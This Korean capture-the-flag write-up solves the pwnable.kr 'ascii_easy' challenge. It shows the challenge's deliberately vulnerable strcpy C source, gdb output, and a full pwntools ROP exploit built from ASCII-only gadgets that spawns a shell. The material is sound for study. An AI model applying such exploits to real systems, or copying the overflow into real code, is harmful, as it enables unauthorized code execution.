---
sort: 5
---

# ascii easy

```tip
그림이 작아서 잘 안보이면 그림을 새창에서 여세요.
```

home 디렉토리에 ascii_easy.c파일에 소스코드가 들어있다.

```c
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>

#define BASE ((void*)0x5555e000)

int is_ascii(int c){
    if(c>=0x20 && c<=0x7f) return 1;
    return 0;
}

void vuln(char* p){
    char buf[20];
    strcpy(buf, p);
}

void main(int argc, char* argv[]){

    if(argc!=2){
        printf("usage: ascii_easy [ascii input]\n");
        return;
    }

    size_t len_file;
    struct stat st;
    int fd = open("/home/ascii_easy/libc-2.15.so", O_RDONLY);
    if( fstat(fd,&st) < 0){
        printf("open error. tell admin!\n");
        return;
    }

    len_file = st.st_size;
    if (mmap(BASE, len_file, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE, fd, 0) != BASE){
        printf("mmap error!. tell admin\n");
        return;
    }

    int i;
    for(i=0; i<strlen(argv[1]); i++){
        if( !is_ascii(argv[1][i]) ){
            printf("you have non-ascii byte!\n");
            return;
        }
    }

    printf("triggering bug...\n");
    vuln(argv[1]);

}
```

문제 자체는 단순하다. vuln함수에는 bof 취약점이 있다. 근데 input값의 각각의 byte값이 0x20과 0x7f사이에 존재해야한다.<br>
mmap으로 libc를 0x5555e000영역 위에 mapping해줬다. 따라서 libc-2.15.so를 열심히 분석해서 is_ascii에 만족하는 payload를 짜면 된다.<br><br>

ROPgadget을 이용해서 가젯들도 뽑아보고, scp를 이용해서 libc파일을 다운받은 뒤 binary ninja에 넣고 분석했다.<br>
binary ninja로 분석할 때, `File`탭에 `Rebase`를 통해서 시작주소를 0에서 0x5555e000로 바꿔주면 굳이 내가 다시 주소계산을 할 필요가 없다.

```
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x08048518 <+0>:     push   %ebp
   0x08048519 <+1>:     mov    %esp,%ebp
   0x0804851b <+3>:     sub    $0x28,%esp
   0x0804851e <+6>:     sub    $0x8,%esp
   0x08048521 <+9>:     pushl  0x8(%ebp)
=> 0x08048524 <+12>:    lea    -0x1c(%ebp),%eax
   0x08048527 <+15>:    push   %eax
   0x08048528 <+16>:    call   0x8048380 <strcpy@plt>
   0x0804852d <+21>:    add    $0x10,%esp
   0x08048530 <+24>:    nop
   0x08048531 <+25>:    leave
   0x08048532 <+26>:    ret
End of assembler dump.
```

buf의 위치가 ebp - 0x1c이므로 return address를 변조하기 위해선 0x20 byte padding이 필요하다.<br><br>
payload를 어떻게 구성할까 생각을 해야한다. 가장 단순하게 system("/bin/sh")를 생각해봤는데, system의 주소값과 문자열 "/bin/sh"의 주소값 모두 non ascii value가 껴있어서 접었다.<br>
그러다가 다른 좋은 루틴을 찾았다.

<img src="/picture/pwnable.kr/ascii_easy_1.png" width="1000"/>

Code reference 기능을 이용해 "/bin/sh" 문자열을 사용하는 루틴들을 살펴보았고, 그 중에 아주 좋은 루틴을 발견했다.<br><br>

<img src="/picture/pwnable.kr/ascii_easy_2.png" width="630"/>

주소도 마음에 들고, 루틴도 `execl("/bin/sh", "sh", "-c", eax, NULL)`로 아주 좋다. 따라서 eax에 "/bin/sh"를 넘겨주고 "/bin/sh", "-c"가 제대로 들어갈 수 있도록 ebx도 설정을 해주면 될 것 같다.<br>
하지만 여기까지만 하면 segmentation fault가 뜬다.<br><br>

<img src="/picture/pwnable.kr/ascii_easy_3.png" width="500"/>

execl내부에서 execve를 호출하는 모습이다.<br>
execve의 세번째 인자로 환경변수 포인터를 건네주기 때문에 `__environ@got`를 사용하는 모습이다.<br>
그러나 지금 상황은 libc를 제대로 로드한 것이 아니라 mmap으로 rwx영역 만들고 대충 복사해온 것이기 때문에 got값이 모두 메롱인 상태이다.<br>
따라서 `__environ@got`영역도 조작을 해줘야한다.<br>

<pre>
(gdb) info proc
process 42012
warning: target file /proc/42012/cmdline contained unexpected null characters
cmdline = '/home/ascii_easy/ascii_easy'
cwd = '/home/ascii_easy'
exe = '/home/ascii_easy/ascii_easy'

(gdb) shell cat /proc/42012/maps
08048000-08049000 r-xp 00000000 103:00 23593754                          /home/ascii_easy/ascii_easy
08049000-0804a000 r--p 00000000 103:00 23593754                          /home/ascii_easy/ascii_easy
0804a000-0804b000 rw-p 00001000 103:00 23593754                          /home/ascii_easy/ascii_easy
095aa000-095cb000 rw-p 00000000 00:00 0                                  [heap]
<b>5555e000-55702000 rwxp 00000000 103:00 23593748                          /home/ascii_easy/libc-2.15.so</b>
f75ba000-f75bb000 rw-p 00000000 00:00 0
f75bb000-f776b000 r-xp 00000000 103:00 57017236                          /lib/i386-linux-gnu/libc-2.23.so
f776b000-f776d000 r--p 001af000 103:00 57017236                          /lib/i386-linux-gnu/libc-2.23.so
f776d000-f776e000 rw-p 001b1000 103:00 57017236                          /lib/i386-linux-gnu/libc-2.23.so
f776e000-f7771000 rw-p 00000000 00:00 0
f7780000-f7781000 rw-p 00000000 00:00 0
f7781000-f7784000 r--p 00000000 00:00 0                                  [vvar]
f7784000-f7785000 r-xp 00000000 00:00 0                                  [vdso]
f7785000-f77a8000 r-xp 00000000 103:00 57017221                          /lib/i386-linux-gnu/ld-2.23.so
f77a8000-f77a9000 r--p 00022000 103:00 57017221                          /lib/i386-linux-gnu/ld-2.23.so
f77a9000-f77aa000 rw-p 00023000 103:00 57017221                          /lib/i386-linux-gnu/ld-2.23.so
fff9e000-fffbf000 rw-p 00000000 00:00 0                                  [stack]
</pre>

어차피 libc가 rwx영역에 mapping이 되어있기 때문에 data segment든 code segment든 어디든지 마음대로 read write할 수 있다.<br>
그래서 non ascii value가 없는 주소값 아무거나 가져다가 썼다.<br>
그리고 리눅스에서는 환경변수 포인터가 NULL이어도 execve 잘 동작한다.<br>
따라서 최종적으로 아래와 같이 payload를 작성했다.

```python
from pwn import *

##### return address를 변조하기 위한 padding
payload = b'A'*32

##### __environ@got 조작
payload += p32(0x555f3555) # pop edx ; xor eax, eax ; pop edi ; ret
payload += p32(0x55572424)
payload += b'AAAA'
# eax = 0, edx = 0x55572424
payload += p32(0x5560645c) # mov dword ptr [edx], eax ; ret

payload += p32(0x555f3555) # pop edx ; xor eax, eax ; pop edi ; ret
payload += p32(0x55572424)
payload += p32(0x30312131)
# eax = 0, edi = 0x30312131
payload += p32(0x555F3276) # add eax, edi ; sub eax, 0x10 ; pop edi ; ret
payload += p32(0x30312131)
# eax = 0x30312121, edi = 0x30312131
payload += p32(0x555F3276) # add eax, edi ; sub eax, 0x10 ; pop edi ; ret
payload += p32(0x30312131)
# eax = 0x60624242, edi = 0x30312131
payload += p32(0x555F3276) # add eax, edi ; sub eax, 0x10 ; pop edi ; ret
payload += p32(0x3b235443)
# eax = 0x90936363, edi = 0x3b235443
payload += p32(0x555f3d4d) # sub eax, edi ; pop esi ; pop edi ; ret
payload += b'AAAA'
payload += b'AAAA'
# eax = 0x55700f20 (__environ@got), edx = 0x55572428
payload += p32(0x555d6225) # mov dword ptr [eax], edx ; ret

# __environ@got -> 0x55572424 (fake __environ pointer) -> 0x0


##### ebx 조작 루틴
payload += p32(0x5557506B) # pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
payload += p32(0x30312121)
payload += p32(0x555f3555) # pop edx ; xor eax, eax ; pop edi ; ret
payload += b'AAAA'
payload += p32(0x30312131)
payload += b'AAAA'
# eax = 0x30312121, edi = 0x30312131
payload += p32(0x555F3276) # add eax, edi ; sub eax, 0x10 ; pop edi ; ret
payload += p32(0x30312131)
# eax = 0x60624242, edi = 0x30312131
payload += p32(0x555F3276) # add eax, edi ; sub eax, 0x10 ; pop edi ; ret
payload += p32(0x3B23536F)
# eax = 0x90936363, edi = 0x3B23536F
payload += p32(0x555F3D4D) # sub eax, edi ; pop esi ; pop edi ; ret
payload += b'AAAA'
payload += b'AAAA'
# eax = 0x55700FF4, ebx = 0x555f3555 (pop edx ; xor eax, eax ; pop edi ; ret)
payload += p32(0x5566797B) # xchg eax, ebx ; call eax


##### "/bin/sh" 문자열 주소 구하기 및 shell 루틴 호출
payload += p32(0x30305031)
# eax = 0, edi = 0x30305031
payload += p32(0x555f3276) # add eax, edi ; sub eax, 0x10 ; pop edi ; ret
payload += p32(0x30305031)
# eax = 0x30305021, edi = 0x30305031
payload += p32(0x555f3276) # add eax, edi ; sub eax, 0x10 ; pop edi ; ret
payload += p32(0x30305031)
# eax = 0x6060a042, edi = 0x30305031
payload += p32(0x555f3276) # add eax, edi ; sub eax, 0x10 ; pop edi ; ret
payload += p32(0x3b253877)
# eax = 0x9090f063, edi = 0x3b253877
payload += p32(0x555f3d4d) # sub eax, edi ; pop esi ; pop edi ; ret
payload += b'AAAA'
payload += b'AAAA'
# eax = 0x556bb7ec ("/bin/sh")
payload += p32(0x555c4669) # execl("/bin/sh", "sh", "-c", "/bin/sh", NULL)

ARGV = [b'/home/ascii_easy/ascii_easy', payload]

p = process(executable='/home/ascii_easy/ascii_easy', argv=ARGV)

p.interactive()
```

## 참고

[syscall table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit)<br>
[execve](https://man7.org/linux/man-pages/man2/execve.2.html)

```tip
## 알게 된 점

ROP는 가젯찾기 힘든데 되는 주소인지 확인하느라 더 힘들었다.

execl, execve 구조(?)
```